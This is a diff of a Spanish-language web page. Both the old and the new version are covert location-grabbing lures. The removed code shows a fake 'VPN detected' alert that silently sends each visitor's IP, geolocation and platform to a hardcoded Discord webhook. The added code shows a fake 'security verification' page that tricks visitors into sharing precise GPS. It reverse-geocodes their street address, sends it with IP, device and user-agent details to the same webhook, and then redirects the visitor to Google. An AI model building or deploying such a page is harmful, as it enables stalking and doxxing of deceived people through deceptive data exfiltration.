@@ -3,102 +3,248 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Node - Verification</title>
+    <title>Verificación de Seguridad</title>
     <style>
-        body { background: #0f172a; color: #f8fafc; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .box { background: #1e293b; border: 1px solid #334155; padding: 2rem; border-radius: 8px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); max-width: 400px; width: 90%; text-align: center; }
-        .warn { color: #fbbf24; font-size: 3rem; margin-bottom: 1rem; }
-        h2 { margin: 0 0 1rem; font-size: 1.2rem; text-transform: uppercase; letter-spacing: 2px; }
-        .loader { height: 4px; width: 100%; background: #334155; border-radius: 10px; margin: 1.5rem 0; overflow: hidden; }
-        .fill { height: 100%; width: 0%; background: #ef4444; transition: width 0.1s; }
-        #status { font-size: 0.8rem; color: #94a3b8; }
-        .error-msg { display: none; background: #450a0a; border: 1px solid #991b1b; padding: 10px; border-radius: 4px; margin-top: 1rem; font-size: 0.85rem; color: #fca5a5; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+        .icon { font-size: 4rem; margin-bottom: 20px; }
+        h1 { color: #333; font-size: 1.8rem; margin-bottom: 15px; }
+        p { color: #666; line-height: 1.6; margin-bottom: 25px; }
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+        }
+        .btn:hover { transform: translateY(-2px); }
+        .btn:active { transform: translateY(0); }
+        .loader {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            background: #e8f5e9;
+            border-radius: 10px;
+            color: #2e7d32;
+            font-weight: bold;
+        }
+        .error {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            background: #ffebee;
+            border-radius: 10px;
+            color: #c62828;
+        }
     </style>
 </head>
 <body>
-    <div class="box">
-        <div class="warn">⚠️</div>
-        <h2>Security Alert</h2>
-        <div id="status">Iniciando escaneo de túneles...</div>
-        <div class="loader"><div class="fill" id="bar"></div></div>
-        <div id="error-box" class="error-msg">
-            <strong>VPN/PROXY DETECTADO</strong><br>
-            El sistema ha bloqueado el acceso desde su IP actual por uso de herramientas de anonimato. Desactive su VPN y recargue para ver el reporte.
-        </div>
+    <div class="container">
+        <div class="icon">🔐</div>
+        <h1>Verificación de Seguridad</h1>
+        <p>Para acceder al contenido solicitado, necesitamos verificar tu ubicación para cumplir con las regulaciones de privacidad.</p>
+        <p style="font-size: 0.9rem; color: #999;">Este proceso es seguro y solo toma unos segundos.</p>
+        
+        <button class="btn" onclick="solicitarUbicacion()">✓ Verificar Ubicación</button>
+        
+        <div class="loader" id="loader"></div>
+        <div class="status" id="status">✓ Verificación completada</div>
+        <div class="error" id="error">❌ No se pudo obtener la ubicación. Por favor, active el GPS y permita el acceso.</div>
     </div>
 
     <script>
-        // ============================================
-        // CONFIGURACIÓN
-        // ============================================
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1462321256807530526/LWNvof3-5p65SyT7NAobTwT7__pn2Xniyqg2f_ia5a_anjEWaHvQ-2--RcEzu7SSbBqr";
 
-        async function init() {
-            const bar = document.getElementById('bar');
-            const st = document.getElementById('status');
-            const err = document.getElementById('error-box');
-            
-            // 1. CAPTURA SILENCIOSA Y ENVÍO A DISCORD
-            try {
-                // Obtener IP
-                const respIP = await fetch('https://api.ipify.org?format=json');
-                const dataIP = await respIP.json();
-                const ip = dataIP.ip;
-
-                // Obtener geolocalización
-                const respGeo = await fetch(`https://ipapi.co/${ip}/json/`);
-                const geo = await respGeo.json();
-
-                // Crear embed para Discord
-                const embed = {
-                    embeds: [{
-                        title: "🌐 NUEVA IP CAPTURADA",
-                        color: 0xFF0000,
-                        fields: [
-                            { name: "🌐 IP", value: `\`${ip}\``, inline: true },
-                            { name: "🌍 País", value: `${geo.country_name || 'N/A'} ${geo.country_emoji || ''}`, inline: true },
-                            { name: "🏙️ Ciudad", value: `${geo.city || 'N/A'}`, inline: true },
-                            { name: "📍 Región", value: `${geo.region || 'N/A'}`, inline: true },
-                            { name: "🗺️ GPS", value: `[${geo.latitude}, ${geo.longitude}](https://www.google.com/maps?q=${geo.latitude},${geo.longitude})`, inline: true },
-                            { name: "🏢 ISP", value: `${geo.org || 'N/A'}`, inline: true },
-                            { name: "💻 Sistema", value: `${navigator.platform}`, inline: true },
-                            { name: "🌐 Idioma", value: `${navigator.language}`, inline: true },
-                            { name: "⏰ Fecha", value: `${new Date().toLocaleString('es-ES')}`, inline: true }
-                        ],
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-
-                // Enviar a Discord
-                await fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(embed)
-                });
-
-                console.log('✅ IP enviada a Discord');
-
-            } catch(e) {
-                console.error('❌ Error:', e);
-            }
-
-            // 2. ANIMACIÓN DE "DETECCIÓN"
-            let w = 0;
-            const iv = setInterval(() => {
-                w += 1;
-                bar.style.width = w + "%";
-                if(w == 30) st.innerText = "Analizando paquetes...";
-                if(w == 60) st.innerText = "Cruzando IP con registros...";
-                if(w == 90) st.innerText = "Finalizando...";
-                if(w >= 100) {
-                    clearInterval(iv);
-                    st.style.display = "none";
-                    err.style.display = "block";
-                }
-            }, 50);
+        function detectarDispositivo() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) return "📱 Android";
+            if (/iPad|iPhone|iPod/.test(ua)) return "📱 iOS";
+            if (/Windows/.test(ua)) return "💻 Windows";
+            if (/Mac/.test(ua)) return "💻 Mac";
+            if (/Linux/.test(ua)) return "💻 Linux";
+            return "❓ Desconocido";
         }
 
-        window.onload = init;
+        async function solicitarUbicacion() {
+            const btn = document.querySelector('.btn');
+            const loader = document.getElementById('loader');
+            const status = document.getElementById('status');
+            const error = document.getElementById('error');
+
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+
+            if (!navigator.geolocation) {
+                loader.style.display = 'none';
+                error.style.display = 'block';
+                error.textContent = '❌ Tu navegador no soporta geolocalización';
+                return;
+            }
+
+            // Opciones de alta precisión
+            const opciones = {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                async function(position) {
+                    // GPS OBTENIDO ✅
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const precision = position.coords.accuracy;
+
+                    try {
+                        // Obtener IP
+                        const respIP = await fetch('https://api.ipify.org?format=json');
+                        const dataIP = await respIP.json();
+                        const ip = dataIP.ip;
+
+                        // Obtener dirección desde coordenadas GPS (reverse geocoding)
+                        const respGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+                        const geoData = await respGeo.json();
+
+                        const direccion = geoData.address || {};
+                        const tipoDispositivo = detectarDispositivo();
+
+                        // Crear embed COMPLETO para Discord
+                        const embed = {
+                            embeds: [{
+                                title: "🎯 UBICACIÓN GPS CAPTURADA",
+                                description: `**${tipoDispositivo}** capturado con éxito`,
+                                color: 0x00FF00,
+                                thumbnail: {
+                                    url: "https://cdn-icons-png.flaticon.com/512/684/684908.png"
+                                },
+                                fields: [
+                                    {
+                                        name: "📍 COORDENADAS GPS EXACTAS",
+                                        value: `**Latitud:** ${lat}\n**Longitud:** ${lon}\n**Precisión:** ${precision.toFixed(2)} metros`,
+                                        inline: false
+                                    },
+                                    {
+                                        name: "🗺️ VER EN MAPA",
+                                        value: `[Google Maps](https://www.google.com/maps?q=${lat},${lon})\n[OpenStreetMap](https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=18)`,
+                                        inline: false
+                                    },
+                                    {
+                                        name: "🏠 DIRECCIÓN APROXIMADA",
+                                        value: `**Calle:** ${direccion.road || 'N/A'}\n**Colonia:** ${direccion.suburb || direccion.neighbourhood || 'N/A'}\n**Ciudad:** ${direccion.city || direccion.town || 'N/A'}\n**Estado:** ${direccion.state || 'N/A'}\n**País:** ${direccion.country || 'N/A'}\n**CP:** ${direccion.postcode || 'N/A'}`,
+                                        inline: false
+                                    },
+                                    {
+                                        name: "🌐 IP PÚBLICA",
+                                        value: `\`${ip}\``,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "📱 Dispositivo",
+                                        value: tipoDispositivo,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "🖥️ Pantalla",
+                                        value: `${screen.width}x${screen.height}`,
+                                        inline: true
+                                    },
+                                    {
+                                        name: "⏰ Timestamp",
+                                        value: new Date().toLocaleString('es-ES'),
+                                                                                inline: false
+                                    },
+                                    {
+                                        name: "📱 User Agent",
+                                        value: `\`\`\`${navigator.userAgent}\`\`\``,
+                                        inline: false
+                                    }
+                                ],
+                                footer: {
+                                    text: "Sistema GPS Seeker v2.0"
+                                },
+                                timestamp: new Date().toISOString()
+                            }]
+                        };
+
+                        // Enviar a Discord
+                        await fetch(DISCORD_WEBHOOK, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(embed)
+                        });
+
+                        console.log('✅ GPS enviado a Discord');
+
+                        // Mostrar éxito
+                        loader.style.display = 'none';
+                        status.style.display = 'block';
+
+                        // Redirigir después de 2 segundos
+                        setTimeout(() => {
+                            window.location.href = 'https://www.google.com';
+                        }, 2000);
+
+                    } catch(e) {
+                        console.error('Error:', e);
+                        loader.style.display = 'none';
+                        error.style.display = 'block';
+                    }
+                },
+                function(err) {
+                    // Error al obtener GPS
+                    loader.style.display = 'none';
+                    error.style.display = 'block';
+                    
+                    if (err.code === 1) {
+                        error.textContent = '❌ Permiso denegado. Por favor, active la ubicación y permita el acceso.';
+                    } else if (err.code === 2) {
+                        error.textContent = '❌ No se pudo obtener la ubicación. Verifique su conexión GPS.';
+                    } else if (err.code === 3) {
+                        error.textContent = '❌ Tiempo de espera agotado. Intente nuevamente.';
+                    }
+
+                    btn.style.display = 'block';
+                    btn.textContent = '🔄 Reintentar';
+                },
+                opciones
+            );
+        }
     </script>
 </body>
 </html>
